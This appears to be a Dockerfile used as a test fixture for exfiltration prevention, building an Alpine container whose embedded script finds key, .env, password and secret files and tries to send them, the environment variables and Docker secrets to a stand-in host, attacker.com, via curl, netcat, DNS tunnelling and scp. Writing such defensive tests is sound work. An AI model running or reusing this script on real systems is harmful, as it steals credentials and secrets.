# Malicious Data Stealer Container
# Purpose: Test data exfiltration prevention

FROM alpine:latest

RUN apk add --no-cache \
    curl \
    wget \
    netcat-openbsd \
    openssh-client \
    tar \
    gzip

# Create a script that attempts various exfiltration methods
RUN cat > /exfiltrate.sh << 'EOF'
#!/bin/sh

echo "Searching for sensitive files..."

# Common sensitive file patterns
PATTERNS="*.key *.pem *.env *.secret *.password *.config .aws .ssh id_rsa"

# Search for sensitive files
find / -type f \( \
  -name "*.key" -o \
  -name "*.pem" -o \
  -name "*.env" -o \
  -name "*.secret" -o \
  -name "*.config" -o \
  -name "*password*" -o \
  -name "*secret*" \
\) 2>/dev/null | while read file; do
  
  echo "Found: $file"
  
  # Attempt 1: HTTP POST
  curl -X POST -F "file=@$file" http://attacker.com:8080/upload 2>&1 || true
  
  # Attempt 2: HTTPS POST
  curl -k -X POST -F "file=@$file" https://attacker.com:8443/upload 2>&1 || true
  
  # Attempt 3: Netcat
  nc attacker.com 9999 < "$file" 2>&1 || true
  
  # Attempt 4: DNS tunneling
  base64 "$file" | while read line; do
    nslookup "${line}.exfil.attacker.com" 2>&1 || true
  done
  
  # Attempt 5: SSH
  scp -o StrictHostKeyChecking=no "$file" attacker@attacker.com:/tmp/ 2>&1 || true
  
done

# Attempt to exfiltrate environment variables
echo "Attempting to exfil environment..."
env | curl -X POST -d @- http://attacker.com/env 2>&1 || true

# Attempt to exfiltrate Docker secrets
echo "Searching for Docker secrets..."
if [ -d /run/secrets ]; then
  tar czf /tmp/secrets.tar.gz /run/secrets 2>/dev/null
  curl -X POST -F "file=@/tmp/secrets.tar.gz" http://attacker.com/secrets 2>&1 || true
fi

echo "Exfiltration attempts complete"
EOF

RUN chmod +x /exfiltrate.sh

CMD ["/exfiltrate.sh"]

# Usage:
# docker build -t malicious-stealer -f data_stealer.Dockerfile .
# 
# Test with mounted volume:
# mkdir -p /tmp/test-secrets
# echo "SECRET_KEY=xyz123" > /tmp/test-secrets/.env
# docker run --rm --network none -v /tmp/test-secrets:/data malicious-stealer
#
# Expected: Files found but all exfiltration attempts fail
